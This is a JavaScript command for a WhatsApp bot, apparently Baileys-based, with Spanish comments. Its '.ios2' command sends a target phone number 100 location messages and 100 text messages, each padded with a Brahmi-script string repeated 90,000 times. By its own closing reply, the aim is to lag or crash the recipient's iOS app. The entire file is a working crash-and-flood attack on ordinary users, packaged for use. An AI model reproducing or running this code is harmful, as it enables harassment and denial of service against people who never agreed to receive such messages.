//by Tobi
let handler = async (m, { text, conn, isGroup, isAdmin }) => {
  if (!text || !text.startsWith('+')) {
    return m.reply('❌ Especifica un número válido.\n\n🐢 Ejemplo: *.ios2 +33753838146*');
  }

  if (isGroup && !isAdmin) {
    return m.reply('❌ Solo los administradores pueden usar este comando en grupos.');
  }

  let numero = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  let textoFinal = '𑇂𑆵𑆴𑆿'.repeat(90000); // Si quieres cambia l cantidad xdxd

  const nombre = '𑇂𑆵𑆴𑆿'.repeat(90000).trim();
  const direccion = '𑇂𑆵𑆴𑆿'.repeat(90000).trim();

  for (let i = 0; i < 100; i++) {
    await conn.sendMessage(numero, {
      location: {
        degreesLatitude: 35.6895,
        degreesLongitude: 139.6917,
        name: nombre,
        address: direccion
      }
    });

    await conn.sendMessage(numero, { text: textoFinal });
  }

  await m.reply(`😼 Se enviaron 200 ubicaciones y texto para dar atraso ios a ${text}`);
};

handler.help = ['ios2 <+número>'];
handler.tags = ['tools'];
handler.command = ['ios2'];
export default handler;